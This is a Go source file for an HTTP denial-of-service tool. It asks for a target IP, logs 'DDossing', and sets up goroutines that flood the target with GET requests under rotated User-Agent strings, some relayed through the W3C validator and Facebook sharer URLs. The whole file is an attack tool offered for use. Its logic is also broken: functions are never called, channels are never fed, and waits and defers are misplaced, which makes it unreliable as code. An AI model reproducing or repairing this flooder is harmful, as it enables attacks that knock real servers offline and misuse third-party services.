package main

import (
	"bufio"
	"fmt"
	"log"
	"math/rand"
	"net"
	"net/http"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

var (
	host string       // Target server IP
	port int    = 80  // Default port
	thr  int    = 135 // Default number of concurrent threads
)

func userAgents() []string {
	uagents := []string{
		"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14",
		"Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0",
		"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
		"Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
		"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7",
		"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
		"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1",
		"Mozilla/5.0 (X11; Linux i686; rv:81.0) Gecko/20100101 Firefox/81.0",
		"Mozilla/5.0 (Linux x86_64; rv:81.0) Gecko/20100101 Firefox/81.0",
		"Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:81.0) Gecko/20100101 Firefox/81.0",
		"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:81.0) Gecko/20100101 Firefox/81.0",
		"Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:81.0) Gecko/20100101 Firefox/81.0",
	}
	return uagents
}

func myBots() []string {
	bots := []string{
		"http://validator.w3.org/check?uri=",
		"http://www.facebook.com/sharer/sharer.php?u=",
	}
	return bots
}

func packetSenderBot(url string, wg *sync.WaitGroup) {
	defer wg.Done()
	for {
		client := &http.Client{}
		req, err := http.NewRequest("GET", url, nil)
		if err != nil {
			log.Println("Error creating request:", err)
			time.Sleep(100 * time.Millisecond)
			continue
		}
		req.Header.Set("User-Agent", userAgents()[rand.Intn(len(userAgents()))])
		resp, err := client.Do(req)
		if err != nil {
			log.Println("Error sending request:", err)
			time.Sleep(100 * time.Millisecond)
			continue
		}
		defer resp.Body.Close()
		log.Println("Sending packets")
		time.Sleep(100 * time.Millisecond)
	}
}

func downIt(wg *sync.WaitGroup) {
	defer wg.Done()
	for {
		packet := fmt.Sprintf("GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\n%s\r\n\r\n", host, userAgents()[rand.Intn(len(userAgents()))], data)
		conn, err := net.Dial("tcp", host+":"+strconv.Itoa(port))
		if err != nil {
			log.Println("Error connecting to server:", err)
			time.Sleep(100 * time.Millisecond)
			continue
		}
		if _, err := conn.Write([]byte(packet)); err != nil {
			log.Println("Error sending packet:", err)
		}
		conn.Close()
		log.Println("Packet sent")
		time.Sleep(100 * time.Millisecond)
	}
}

func dos(wg *sync.WaitGroup) {
	defer wg.Done()
	for {
		<-q
	}
}

func dos2(wg *sync.WaitGroup) {
	defer wg.Done()
	for {
		<-w
		go packetSenderBot(myBots()[rand.Intn(len(myBots()))]+"http://"+host, wg)
	}
}

var data = `Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip,deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Keep-Alive: 115
Connection: keep-alive`

var q = make(chan int)
var w = make(chan int)

func main() {
	log.SetFlags(log.LstdFlags | log.Lshortfile)

	reader := bufio.NewReader(os.Stdin)
	fmt.Print("Enter target server IP: ")
	input, _ := reader.ReadString('\n')
	host = strings.TrimSpace(input)

	log.Println("DDossing", host)

	for i := 0; i < thr; i++ {
		wg := sync.WaitGroup{}
		wg.Add(1)
		go dos(&wg)
		wg.Add(1)
		go dos2(&wg)
		wg.Wait()
	}

	e := make(chan struct{})
	<-e
}
